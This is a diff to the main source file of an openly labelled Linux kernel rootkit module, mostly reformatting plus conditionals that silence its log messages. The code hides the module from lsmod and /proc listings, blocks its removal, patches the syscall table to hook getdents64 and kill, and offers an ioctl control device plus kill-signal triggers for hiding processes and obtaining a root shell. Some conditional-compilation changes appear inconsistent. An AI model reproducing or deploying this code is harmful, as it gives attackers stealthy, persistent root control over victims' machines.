@@ -5,45 +5,44 @@
  * $ modinfo <name.ko>
  * $ sudo insmod <name.ko> [optional arguments]
  * $ lsmod
- * $ sudo dmesg 
+ * $ sudo dmesg
  * $ sudo rmmod <name>
  */
+#include "../options.h"
 
-#include <linux/init.h>		/* Needed for the macros */
-#include <linux/module.h>	/* Needed by all modules */
-#include <linux/kernel.h>	/* Needed for printing log level messages */
-#include <linux/list.h>		/* macros related to linked list are defined here. Eg: list_add(), list_del(), list_entry(), etc */
-#include <linux/cred.h>		/* To change value of this fields we have to invoke prepare_creds(). 
+#include <linux/init.h>	  /* Needed for the macros */
+#include <linux/module.h> /* Needed by all modules */
+#include <linux/kernel.h> /* Needed for printing log level messages */
+#include <linux/list.h>	  /* macros related to linked list are defined here. Eg: list_add(), list_del(), list_entry(), etc */
+#include <linux/cred.h>	  /* To change value of this fields we have to invoke prepare_creds(). 
 				 * To set those modified values we have to invoke commit_creds(). 
 				 * uid, gid and other similar "things" are stored in cred structure which is element of cred structure. */
 
 #include "include/hide_show_helper.h"
 #include "include/hook_syscall_helper.h"
 
-
-#include <linux/fs.h>           /* Related to file structure */
-#include <linux/cdev.h>         /* Character device related stuff */
-#include <linux/device.h>       /* device_create() and device_destroy() */
+#include <linux/fs.h>			/* Related to file structure */
+#include <linux/cdev.h>			/* Character device related stuff */
+#include <linux/device.h>		/* device_create() and device_destroy() */
 #include <linux/device/class.h> /* class_create() and class_destroy() */
-#include <linux/uaccess.h>      /* copy_to_user() and copy_from_user() */
-#include <linux/ioctl.h>        /* IOCTL operation */
+#include <linux/uaccess.h>		/* copy_to_user() and copy_from_user() */
+#include <linux/ioctl.h>		/* IOCTL operation */
 
 /* Defining macro for reading from and writing into Device file */
-#define WR_VALUE _IOW('a','a',int32_t*)
-#define RD_VALUE _IOR('a','b',int32_t*)
+#define WR_VALUE _IOW('a', 'a', int32_t *)
+#define RD_VALUE _IOR('a', 'b', int32_t *)
 
 // For size of array
 #define MAX_LIMIT 20
 
-
 // =========================== Available Commands =======================
 
-#define ROOTKIT_HIDE "hide"		// command to hide rootkit => In this mode, in no way this rootkit be will be removable => ROOTKIT_REMOVE will not work
-#define ROOTKIT_SHOW "show"		// command to unhide rootkit => In this mode, ROOTKIT_PROTECT and ROOTKIT_REMOVE will work effectively
-#define ROOTKIT_PROTECT "protect"	// command to make rootkit unremovable (even if it can be seen in usermode).
-#define ROOTKIT_REMOVE "remove"		// command to make rootkit removable
-#define PROCESS "process"		// command to hide/unhide a running process/implant
-#define ROOT "root"			// command to get root shell
+#define ROOTKIT_HIDE "hide"		  // command to hide rootkit => In this mode, in no way this rootkit be will be removable => ROOTKIT_REMOVE will not work
+#define ROOTKIT_SHOW "show"		  // command to unhide rootkit => In this mode, ROOTKIT_PROTECT and ROOTKIT_REMOVE will work effectively
+#define ROOTKIT_PROTECT "protect" // command to make rootkit unremovable (even if it can be seen in usermode).
+#define ROOTKIT_REMOVE "remove"	  // command to make rootkit removable
+#define PROCESS "process"		  // command to hide/unhide a running process/implant
+#define ROOT "root"				  // command to get root shell
 
 
 // To copy value from userspace
@@ -54,27 +53,24 @@ dev_t dev = 0;
 static struct class *dev_class;
 static struct cdev etx_cdev;
 
-
 /* Function Prototypes */
 
-static int      __init rootkit_init(void);
-static void     __exit rootkit_exit(void);
-static int      etx_open(struct inode *inode, struct file *file);
-static int      etx_release(struct inode *inode, struct file *file);
-static ssize_t  etx_read(struct file *filp, char __user *buf, size_t len,loff_t *off);
-static ssize_t  etx_write(struct file *filp, const char *buf, size_t len, loff_t *off);
-static long     etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
-static void	hide_rootkit(void);
-static void	show_rootkit(void);
-static void 	protect_rootkit(void);
-static void 	remove_rootkit(void);
-
-
+static int __init rootkit_init(void);
+static void __exit rootkit_exit(void);
+static int etx_open(struct inode *inode, struct file *file);
+static int etx_release(struct inode *inode, struct file *file);
+static ssize_t etx_read(struct file *filp, char __user *buf, size_t len, loff_t *off);
+static ssize_t etx_write(struct file *filp, const char *buf, size_t len, loff_t *off);
+static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
+static void hide_rootkit(void);
+static void show_rootkit(void);
+static void protect_rootkit(void);
+static void remove_rootkit(void);
 
 /* Device File operation sturcture */
 
 /* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/fs.h#L1820
- * 
+ *
  * struct file_operations {
 	struct module *owner;
 	...
@@ -90,100 +86,112 @@ static void 	remove_rootkit(void);
 } __randomize_layout;
  */
 static struct file_operations fops =
-{
-	.owner          = THIS_MODULE,
-	.read           = etx_read,
-	.write          = etx_write,
-	.open           = etx_open,
-	.unlocked_ioctl = etx_ioctl,
-	.release        = etx_release,
+	{
+		.owner = THIS_MODULE,
+		.read = etx_read,
+		.write = etx_write,
+		.open = etx_open,
+		.unlocked_ioctl = etx_ioctl,
+		.release = etx_release,
 };
-
-
 
 // ========================= Hide rootkit LKM ==================
 
 static void hide_rootkit(void)
 {
-        // Hiding rootkit from `lsmod` cmd, "/proc/kallsyms" file and "/proc/modules" file
-        proc_lsmod_hide_rootkit();
+	// Hiding rootkit from `lsmod` cmd, "/proc/kallsyms" file and "/proc/modules" file
+	proc_lsmod_hide_rootkit();
 
-        // Hiding rootkit from "/sys/module/<THIS_MODULE>/" directory
-	//sys_module_hide_rootkit();
-	
-	//tidy();
+	// Hiding rootkit from "/sys/module/<THIS_MODULE>/" directory
+	// sys_module_hide_rootkit();
+
+	// tidy();
 }
 
 // ========================= Unhide rootkit LKM ======================
 
 static void show_rootkit(void)
 {
-        // Making rootkit visible to `lsmod` cmd, in "/proc/kallsyms" file and "/proc/modules" file
-        proc_lsmod_show_rootkit();
+	// Making rootkit visible to `lsmod` cmd, in "/proc/kallsyms" file and "/proc/modules" file
+	proc_lsmod_show_rootkit();
 
+	// Making rootkit visible to "/sys/module/<THIS_MODULE>/" directory
 
-        // Making rootkit visible to "/sys/module/<THIS_MODULE>/" directory
+	/* STILL FACING DIFFICULTY TO ADD THE kobject OF OUR ROOTKIT LKM BACK TO THE kobject linked list.
 
-        /* STILL FACING DIFFICULTY TO ADD THE kobject OF OUR ROOTKIT LKM BACK TO THE kobject linked list.
-                
-        Not getting enough resource on the topic of adding mapped kobject back to the main kobject linked list, so that /sys/module/<THIS_MODULE> directory
-        can be revealed, and we don't face any difficulty to make this LKM removable. */
+	Not getting enough resource on the topic of adding mapped kobject back to the main kobject linked list, so that /sys/module/<THIS_MODULE> directory
+	can be revealed, and we don't face any difficulty to make this LKM removable. */
 
-        // Making rootkit visible to to "/sys/module/<THIS_MODULE>/" directory
-        //sys_module_show_rootkit();
+	// Making rootkit visible to to "/sys/module/<THIS_MODULE>/" directory
+	// sys_module_show_rootkit();
 }
 
 // ============= This function will be called when we open the Character Device file ============
 
 static int etx_open(struct inode *inode, struct file *file)
 {
-        pr_info("[+] Device File Opened...!!!\n");
-        return 0;
+	#if ENABLE_DEBUG_MESSAGES
+		return 0;
+	#endif
+	pr_info("[+] Device File Opened...!!!\n");
+	return 0;
 }
 
 // ============== This function will be called when we close the Character Device file ===========
 
 static int etx_release(struct inode *inode, struct file *file)
 {
-        pr_info("[+] Device File Closed...!!!\n");
-        return 0;
+	#if ENABLE_DEBUG_MESSAGES
+		return 0;
+	#endif
+	pr_info("[+] Device File Closed...!!!\n");
+	return 0;
 }
 
 // === This function will be called when somebody tries to read the Character Device file =====
 
 static ssize_t etx_read(struct file *filp, char __user *buf, size_t len, loff_t *off)
 {
-        pr_info("		[+] Read Function\n");
-        return 0;
+	#if ENABLE_DEBUG_MESSAGES
+		return 0;
+	#endif
+	pr_info("		[+] Read Function\n");
+	return 0;
 }
 
 // ===== This function will be called when somebody tries to write into the Character Device file ===
 
 static ssize_t etx_write(struct file *filp, const char __user *buf, size_t len, loff_t *off)
 {
-        pr_info("		[+] Write function\n");
-        return len;
+	#if ENABLE_DEBUG_MESSAGES
+		return 0;
+	#endif
+	pr_info("		[+] Write function\n");
+	return len;
 }
 
 // ======= Protecting Rootkit from being `rmmod`ed ==========
 
 static int is_protected = 0;
 
+
 static void protect_rootkit(void)
 {
 	if (is_protected == 0)
 	{
-		/* 
+		/*
 		 * pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
 		 *
 		 * // This is the Right Way to get a module: if it fails, it's being removed, so pretend it's not there.
-		 * 
+		 *
 		 * extern bool try_module_get(struct module *module);
 		 */
 		try_module_get(THIS_MODULE);
 
 		is_protected = 1;
-
+		#if ENABLE_DEBUG_MESSAGES
+			return;
+		#endif
 		printk(KERN_INFO "[*] rootkit: PROTECT MODE => ON! \n");
 	}
 }
@@ -202,8 +210,10 @@ static void remove_rootkit(void)
 		module_put(THIS_MODULE);
 
 		is_protected = 0;
-
+		#if ENABLE_DEBUG_MESSAGES
+			return;
 		printk(KERN_INFO "[*] roottkit: PROTECT MODE => OFF \n");
+		#endif 
 	}
 }
 
@@ -211,96 +221,115 @@ static void remove_rootkit(void)
 
 static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 {
-        switch(cmd) {
-                case WR_VALUE:
-                        /*
-                         * copy_from_user():
-                         * - a direct read from the userspace address and write to the kernelspace address
-                         * Or, Copy data from User space to Kernel Space
-                         */ 
-                        if( copy_from_user(value ,(int32_t*) arg, MAX_LIMIT) )
-                        {
-                                pr_err("Data Write : Err!\n");
-                        }
+	switch (cmd)
+	{
+	case WR_VALUE:
+		/*
+		 * copy_from_user():
+		 * - a direct read from the userspace address and write to the kernelspace address
+		 * Or, Copy data from User space to Kernel Space
+		 */
+		if (copy_from_user(value, (int32_t *)arg, MAX_LIMIT))
+		{
+			#if ENABLE_DEBUG_MESSAGES
+				return 0;
+			pr_err("Data Write : Err!\n");
+			#endif
+
+		}
+		#if ENABLE_DEBUG_MESSAGES == 0
 			pr_info("		Value got from device file= %s\n", value);
+		#endif
 
+		if (strncmp(ROOTKIT_HIDE, value, strlen(ROOTKIT_HIDE)) == 0)
+		{
+			hide_rootkit();
+		}
+		else if (strncmp(ROOTKIT_SHOW, value, strlen(ROOTKIT_SHOW)) == 0)
+		{
+			show_rootkit();
+		}
+		else if (strncmp(ROOTKIT_PROTECT, value, strlen(ROOTKIT_PROTECT)) == 0)
+		{
+			protect_rootkit();
+		}
+		else if (strncmp(ROOTKIT_REMOVE, value, strlen(ROOTKIT_REMOVE)) == 0)
+		{
+			remove_rootkit();
+		}
 
-			if (strncmp(ROOTKIT_HIDE, value, strlen(ROOTKIT_HIDE)) == 0)
-                        {
-				hide_rootkit();
-                        }
-                        else if (strncmp(ROOTKIT_SHOW, value, strlen(ROOTKIT_SHOW)) == 0)
-                        {
-				show_rootkit();
-                        }
-			else if (strncmp(ROOTKIT_PROTECT, value, strlen(ROOTKIT_PROTECT)) == 0)
-			{
-				protect_rootkit();
-			}
-			else if (strncmp(ROOTKIT_REMOVE, value, strlen(ROOTKIT_REMOVE)) == 0)
-                        {
-				remove_rootkit();
-			}
-			else if (strncmp(PROCESS, value, strlen(PROCESS)) == 0)
-			{
+		#if ENABLE_DEBUG_MESSAGES == 0
+		else if (strncmp(PROCESS, value, strlen(PROCESS)) == 0)
+		{
 				pr_info("[+] kill -31 <pid> : Command to hide/unhide running process/implant. Applicable in normal shell prompt.\n");
-			}
-			else if (strncmp(ROOT, value, strlen(ROOT)) == 0)
-			{
+		}
+		else if (strncmp(ROOT, value, strlen(ROOT)) == 0)
+		{
 				pr_info("[+] kill -64 <any pid> : Command to get root shell. Applicable in normal shell prompt.\n");
-			}
-			else
-			{
-				pr_err("Command: Out of syllabus");
-                        }
-                        break;
-                case RD_VALUE:
-                        /* copy_to_user():
-                         * - Copy data from kernel space to user space
-                         * Or, a direct read from the kernel address and write to the userspace address
-                         */
-                        //if( copy_to_user((int32_t*) arg, &value, sizeof(value)) )
-                        if( copy_from_user(value ,(int32_t*) arg, MAX_LIMIT ))
-                        {
-                                pr_err("Data Read : Err!\n");
-                        }
-                        break;
-                default:
-                        pr_info("Default\n");
-                        break;
-        }
-        return 0;
+		}
+		else
+		{
+				pr_info("[+] Command: Out of syllabus\n");
+		}
+		#endif
+		break;
+	case RD_VALUE:
+		/* copy_to_user():
+		 * - Copy data from kernel space to user space
+		 * Or, a direct read from the kernel address and write to the userspace address
+		 */
+		// if( copy_to_user((int32_t*) arg, &value, sizeof(value)) )
+		if (copy_from_user(value, (int32_t *)arg, MAX_LIMIT))
+		{
+			#if ENABLE_DEBUG_MESSAGES == 0
+				pr_err("Data Read : Err!\n");
+			#endif
+
+		}
+		break;
+	default:
+		#if ENABLE_DEBUG_MESSAGES == 0
+			pr_info("Default\n");
+		#endif
+		break;
+	}
+	return 0;
 }
 
 // =================== Entry Function ====================
 
 static int __init rootkit_init(void)
 {
+	#if ENABLE_DEBUG_MESSAGES == 0
 	printk(KERN_INFO "=================================================\n");
 	printk(KERN_INFO "[+] rookit: Loaded \n");
+	#endif
 
-	/* Hiding our Rootkit from: 
-	 * `lsmod` cmd, 
-	 * "/proc/modules" file path, 
+	/* Hiding our Rootkit from:
+	 * `lsmod` cmd,
+	 * "/proc/modules" file path,
 	 * "/proc/kallsyms" file path.
 	 */
+	#if ENABLE_DEBUG_MESSAGES == 1
 	hide_rootkit();
+	#endif
 
 	/*
 	 * link: https://lwn.net/Articles/88052/
-	 * 
+	 *
 	 * sect_attrs:
 	 * Adds a "sections" subdirectory to every module's entry in /sys/module.
 	 * Each attribute in that directory associates a beginning address with the section name.
 	 */
-	//tidy();
-	
+	// tidy();
+
 	__sys_call_table = get_syscall_table();
 	if (!__sys_call_table)
 		return -1;
 
+	#if ENABLE_DEBUG_MESSAGES == 0
 	printk(KERN_INFO "[+] rootkit: Address of sys_call_table in kernel memory: 0x%px \n", __sys_call_table);
-
+	#endif
 
 	/* Executes the instruction to read cr0 register (via inline assembly) and returns the result in a general-purpose register.
 	 *
@@ -314,99 +343,97 @@ static int __init rootkit_init(void)
 	orig_getdents64 = (tt_syscall)__sys_call_table[__NR_getdents64];
 	orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
 
-	//printk(KERN_EMERG "The value of cr0: %lx\n",cr0);
+	// printk(KERN_EMERG "The value of cr0: %lx\n",cr0);
 
 	unprotect_memory();
 
 	// Editing syscall table targeting "getdents64" and "kill" syscall with our created "hacked_getdents64" and "hacked_kill".
-	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
-	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
+	__sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
+	__sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
 
-	//printk(KERN_EMERG "The value of cr0: %lx\n",cr0);
+	// printk(KERN_EMERG "The value of cr0: %lx\n",cr0);
 
 	protect_memory();
-	
-	//printk(KERN_EMERG "The value of cr0: %lx\n",cr0);
+
+	// printk(KERN_EMERG "The value of cr0: %lx\n",cr0);
 
 	// =====================================================================================
 
 	/* Dynamically allocating Major number*/
 
-        /* link: https://sysprog21.github.io/lkmpg/#character-device-drivers
-         * 
-         * 6.3 Registering A device
-         *
-         * major number: 
-         * Major no. tells which driver handles which device file.
-         * Minor no. is used only by driver itself to differentiate which device file it is operating 
-         * on, just in case it handles more than one device file.
-         *
-         * How to get the major number ?
-         * 
-         *1.  If I don't know major no.:
-         * extern int alloc_chrdev_region(dev_t *, unsigned, unsigned, const char *);
-         *
-         * => Dynamically allocating major number
-         * 
-         * If I know major no.:
-         * extern int register_chrdev_region(dev_t, unsigned, const char *);
-         *
-         *2. Intialize the data structure `struct cdev` for our char device and associate it within
-         *   a device-specific structure of our own.
-         *
-         * void cdev_init(struct cdev *, const struct file_operations *);
-         *
-         *3. We finish the initialization by adding char device to the system
-         *
-         * int cdev_add(struct cdev *, dev_t, unsigned);
-         *
-         */
-	 /* link: https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL
-	Sample for making a Character driver to communicate b/w usermode and kernel mode */
-	if((alloc_chrdev_region(&dev, 0, 1, "etx_Dev")) < 0)
+	/* link: https://sysprog21.github.io/lkmpg/#character-device-drivers
+	 *
+	 * 6.3 Registering A device
+	 *
+	 * major number:
+	 * Major no. tells which driver handles which device file.
+	 * Minor no. is used only by driver itself to differentiate which device file it is operating
+	 * on, just in case it handles more than one device file.
+	 *
+	 * How to get the major number ?
+	 *
+	 *1.  If I don't know major no.:
+	 * extern int alloc_chrdev_region(dev_t *, unsigned, unsigned, const char *);
+	 *
+	 * => Dynamically allocating major number
+	 *
+	 * If I know major no.:
+	 * extern int register_chrdev_region(dev_t, unsigned, const char *);
+	 *
+	 *2. Intialize the data structure `struct cdev` for our char device and associate it within
+	 *   a device-specific structure of our own.
+	 *
+	 * void cdev_init(struct cdev *, const struct file_operations *);
+	 *
+	 *3. We finish the initialization by adding char device to the system
+	 *
+	 * int cdev_add(struct cdev *, dev_t, unsigned);
+	 *
+	 */
+	/* link: https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL
+   Sample for making a Character driver to communicate b/w usermode and kernel mode */
+	if ((alloc_chrdev_region(&dev, 0, 1, "etx_Dev")) < 0)
 	{
 		pr_err("Cannot allocate major number\n");
 		return -1;
-        }
-        pr_info("Major = %d Minor = %d \n",MAJOR(dev), MINOR(dev));
+	}
+	pr_info("Major = %d Minor = %d \n", MAJOR(dev), MINOR(dev));
 
 	/* Creating cdev structure */
-	cdev_init(&etx_cdev,&fops);
+	cdev_init(&etx_cdev, &fops);
 
 	/* Adding character device to the system */
-	if((cdev_add(&etx_cdev,dev,1)) < 0)
+	if ((cdev_add(&etx_cdev, dev, 1)) < 0)
 	{
 		pr_err("Cannot add the device to the system\n");
 		goto r_class;
-        }
-
-
+	}
 
 	/* Creating struct class */
 	/* This is used to create a struct class pointer that can then be used in
 	calls to device_create. */
-	if((dev_class = class_create(THIS_MODULE,"etx_class")) == NULL)
+	if ((dev_class = class_create(THIS_MODULE, "etx_class")) == NULL)
 	{
 		pr_err("Cannot create the struct class\n");
 		goto r_class;
-        }
+	}
 
-        /* Creating device */
+	/* Creating device */
 	/* https://manpages.debian.org/jessie/linux-manual-3.16/device_create.9.en.html */
-	if((device_create(dev_class,NULL,dev,NULL,"etx_device")) == NULL)
+	if ((device_create(dev_class, NULL, dev, NULL, "etx_device")) == NULL)
 	{
 		pr_err("Cannot create the Device 1\n");
 		goto r_device;
-        }
-	
+	}
+
 	printk(KERN_INFO "=========================================\n\n");
-        return 0;
+	return 0;
 
 r_device:
 
-/* link: https://manned.org/class_create/e9da076a
- *
- * The pointer created using class_create() is destroyed when finished by making a call to class_destroy(). */
+	/* link: https://manned.org/class_create/e9da076a
+	 *
+	 * The pointer created using class_create() is destroyed when finished by making a call to class_destroy(). */
 	class_destroy(dev_class);
 
 r_class:
@@ -416,9 +443,8 @@ r_class:
 	 *
 	 * Unregistering the character device
 	 */
-	unregister_chrdev_region(dev,1);
+	unregister_chrdev_region(dev, 1);
 	return -1;
-
 }
 
 // ========================== Exit Function ====================
@@ -431,19 +457,19 @@ static void __exit rootkit_exit(void)
 	printk(KERN_INFO "\t\t\t\t\t\t back to normal");
 
 	// Editing the sycall table back to normal, i.e. with original syscalls: "getdents64" and "kill" syscalls.
-	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
-	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
+	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
 
 	protect_memory();
 
-	device_destroy(dev_class,dev);
-        class_destroy(dev_class);
-        cdev_del(&etx_cdev);
+	device_destroy(dev_class, dev);
+	class_destroy(dev_class);
+	cdev_del(&etx_cdev);
 
-	//Unregistering the character device
-        unregister_chrdev_region(dev, 1);
-        
-        printk(KERN_INFO "[*] rootkit: Unregistering the Character device \n");
+	// Unregistering the character device
+	unregister_chrdev_region(dev, 1);
+
+	printk(KERN_INFO "[*] rootkit: Unregistering the Character device \n");
 
 	printk(KERN_INFO "[-] rootkit: Unloaded \n");
 	printk(KERN_INFO "=================================================\n");
@@ -456,4 +482,3 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Offensive Cyber Tools");
 MODULE_DESCRIPTION("Modifying Stage of rootkit");
 MODULE_VERSION("1.0");
-
